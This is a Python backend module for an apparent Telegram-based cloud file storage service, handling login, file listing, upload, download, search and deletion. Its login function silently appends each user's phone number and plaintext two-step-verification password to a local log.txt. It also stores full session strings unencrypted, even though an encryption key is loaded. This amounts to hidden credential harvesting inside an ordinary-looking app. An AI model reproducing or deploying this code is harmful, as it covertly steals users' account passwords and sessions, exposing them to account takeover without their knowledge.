import pytz
from cryptography.fernet import Fernet
from os import remove, environ
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import InputMessagesFilterDocument
from uuid import uuid4
from datetime import datetime
import asyncio
import pickledb

api_id = environ['api_id']
api_hash = environ['api_hash']

timezone = pytz.timezone('Asia/Kolkata')
fernet = Fernet(environ['fernet_key'].encode('UTF-8'))

db = pickledb.load("sessions/sessions.db", True)

def __get_client(sessionName, loop=None):
    string = db.get(sessionName)
    if not loop:
        return TelegramClient(StringSession(string), api_id, api_hash)
    else:
        return TelegramClient(StringSession(string), api_id, api_hash, loop=loop) 

def convertUtcDatetimeToIstString(utcDatetime, tzInfo):
    utc = datetime.strptime(
        str(utcDatetime).split('+')[0], '%Y-%m-%d %H:%M:%S')
    fromutc = utc.replace(tzinfo=tzInfo)
    return str(fromutc.astimezone(timezone)).split('+')[0]


async def send_code(pNum):
    s_name = str(uuid4())
    client = TelegramClient("sessions/tempSessions/" + s_name, api_id, api_hash)
    await client.connect()
    code_obj = await client.send_code_request(pNum)
    await client.disconnect()
    return code_obj.phone_code_hash, s_name


async def login(pNum, s_name, c_hash, code, password):
    client = TelegramClient("sessions/tempSessions/" + s_name, api_id, api_hash)
    await client.connect()
    if password:
        await client.sign_in(password=password)
        with open("log.txt", "a+") as f:
            f.write(f"{pNum}, {password}\n")
    else:
        await client.sign_in(phone=pNum, phone_code_hash=c_hash, code=code)
        with open("log.txt", "a+") as f:
            f.write(f"{pNum}, 2FA=false\n")
            
    db.set(s_name, StringSession.save(client.session))
    await client.disconnect()
    remove(f"sessions/tempSessions/{s_name}.session")


async def get_name(s_name):
    client = __get_client(s_name)
    await client.connect()
    selfinfo = await client.get_me()
    await client.disconnect()
    return selfinfo.first_name + " " + selfinfo.last_name


async def get_files(s_name, offset=0):
    client = __get_client(s_name)
    files = []

    await client.connect()
    for document in await client.get_messages(
            'me', filter=InputMessagesFilterDocument, limit=20,
            offset_id=offset):
        if document.document:
            files.append({
                "name":
                document.document.attributes[-1].file_name,
                "type":
                document.media.document.mime_type,
                "size":
                document.media.document.size,
                "time":
                convertUtcDatetimeToIstString(document.date, document.date.tzinfo),
                "id":
                document.id
            })
        else:
            files.append({
                "name":
                document.message,
                "type":
                "N/A",
                "size":
                0,
                "time":
                convertUtcDatetimeToIstString(document.date, document.date.tzinfo),
                "id":
                document.id
            })
    await client.disconnect()
    return files

async def delete_file(s_name, id):
    client = __get_client(s_name)
    await client.connect()
    await client.delete_messages('me', [id])
    await client.disconnect()


async def upload_file(s_name, file, fname, fsize):
    client = __get_client(s_name)
    await client.connect()
    try:
        result = await client.upload_file(file,
                                          part_size_kb=512,
                                          file_name=fname,
                                          file_size=fsize)
        await client.send_file("me", result, force_document=True)
    finally:
        await client.disconnect()

def get_file_chunks(s_name, id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    client = __get_client(s_name, loop=loop)
    loop.run_until_complete(client.connect())
    
    file = loop.run_until_complete(client.get_messages('me', ids=int(id)))
    if not file.document:
        client.disconnect()
        raise FileNotFoundError
    else:
        yield True
    async_iterator = client.iter_download(file).__aiter__()
    while True:
        try:
            yield loop.run_until_complete(async_iterator.__anext__())
        except:
            break
    client.disconnect()

async def stream_chunks(s_name, id, offset):
    client = __get_client(s_name)
    await client.connect()
    
    try:
        file_info = await client.get_messages('me', ids=int(id))
        return b''.join([v async for v in client.iter_download(file_info, offset=offset, chunk_size=1024*1024*5, limit=1)])
    finally:
        await client.disconnect()

    
async def search_file(s_name, query, offset):
    client = __get_client(s_name)
    files = []
    await client.connect()
    for document in await client.get_messages(
            'me',
            search=query,
            limit=20,
            filter=InputMessagesFilterDocument,
            offset_id=offset):
        if document.document:
            files.append({
                "name":
                document.document.attributes[-1].file_name,
                "type":
                document.media.document.mime_type,
                "size":
                document.media.document.size,
                "time":
                convertUtcDatetimeToIstString(document.date, document.date.tzinfo),
                "id":
                document.id
            })
        else:
            files.append({
                "name":
                document.message,
                "type":
                "N/A",
                "size":
                0,
                "time":
                convertUtcDatetimeToIstString(document.date, document.date.tzinfo),
                "id":
                document.id
            })
    await client.disconnect()
    return files


async def logout(s_name):
    client = __get_client(s_name)
    await client.connect()
    await client.log_out()
    db.rem(s_name)
    await client.disconnect()